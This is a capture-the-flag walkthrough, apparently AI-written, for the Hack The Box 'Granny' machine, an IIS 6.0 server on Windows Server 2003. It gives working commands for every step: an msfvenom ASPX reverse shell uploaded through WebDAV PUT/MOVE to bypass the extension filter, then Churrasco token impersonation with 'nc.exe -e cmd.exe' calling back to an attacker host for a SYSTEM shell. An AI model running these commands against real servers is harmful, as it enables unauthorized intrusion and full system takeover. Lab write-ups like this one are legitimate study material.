[Done](Done)
# 👵 HTB: Granny – Walkthrough

**Machine Info:**
- **IP**: `10.129.83.212`
- **OS**: [Windows Server 2003](Windows)
- **Difficulty**: [Easy](Easy)
- **Exploits Used**:
  - [HTTP](HTTP) WebDAV PUT/MOVE
  - File extension bypass via `.txt → .aspx`
  - Local PrivEsc using `Churrasco.exe`

---

## 🔍 Reconnaissance

### 🔎 Fast Port Scan
```bash
nmap -p- -T5 10.10.10.15
```
Only **port 80 ([HTTP](HTTP))** is open.

### 📌 Service Enumeration
```bash
nmap -p 80 -A 10.10.10.15 -v
```
- **Service**: Microsoft IIS httpd 6.0
- **Extensions**: WebDAV (with support for `PUT`, `MOVE`, `PROPFIND`, etc.)

---

## 🧪 WebDAV Enumeration

### 🛠️ Check WebDAV Methods
```bash
davtest -url http://10.10.10.15
```

Result:
- Can **upload** files (`PUT`)
- Can **rename/move** files (`MOVE`)
- But only `.html` and `.txt` can be **executed**
- **Workaround**: upload `.aspx` as `.txt`, then `MOVE` it back to `.aspx`

[🔗 WebDAV Exploit Reference](https://vk9-sec.com/exploiting-webdav/)

---

## 🚀 Exploitation – Upload Reverse Shell

### 1️⃣ Create ASPX Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx -o shell.aspx
mv shell.aspx shell.txt
```

### 2️⃣ Upload Using [HTTP](HTTP) `PUT`
```bash
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
```

### 3️⃣ Rename Using [HTTP](HTTP) `MOVE`
```bash
curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
```

### 4️⃣ Start Listener
```bash
nc -nvlp 4444
```

### 5️⃣ Trigger Shell
Visit in browser:
```
http://10.10.10.15/shell.aspx
```

---

## 🐚 Shell Gained
```cmd
whoami
nt authority\network service
```

---

## 🚪 Privilege Escalation – SYSTEM

### 1️⃣ System Info
```cmd
systeminfo
```
- OS: **Windows Server 2003**
- Vulnerable to token impersonation (Churrasco)

### 2️⃣ Download Churrasco
```bash
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
mv churrasco.exe churrasco.txt
```

### 3️⃣ Upload via [HTTP](HTTP)
```bash
curl -X PUT http://10.10.10.15/churrasco.txt --data-binary @churrasco.txt
```

### 4️⃣ Rename in Shell
```cmd
ren churrasco.txt churrasco.exe
```

### 5️⃣ Upload `nc.exe`
```bash
cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop
mv nc.exe nc.txt
curl -X PUT http://10.10.10.15/nc.txt --data-binary @nc.txt
ren nc.txt nc.exe
```

---

## 💥 SYSTEM Shell

### 1️⃣ Listener
```bash
nc -nvlp 5555
```

### 2️⃣ Execute Reverse Shell
```cmd
churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.13 5555"
```

---

## 🎯 Proof

### 🧍‍♂️ User Flag
```cmd
type C:\Documents and Settings\lakis\Desktop\user.txt
```

### 👑 Root Flag
```cmd
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

---

## ✅ Summary

| Phase              | Method                                         |
|-------------------|------------------------------------------------|
| Recon              | Found IIS 6.0 with [HTTP](HTTP) WebDAV        |
| Initial Access     | Used PUT/MOVE to bypass extension restriction |
| Privilege Escalation | Token impersonation using `Churrasco.exe` |
| Final Access       | SYSTEM shell via netcat                       |

---

Let me know if you’d like this converted into a downloadable Markdown doc or exported for reporting 💾📄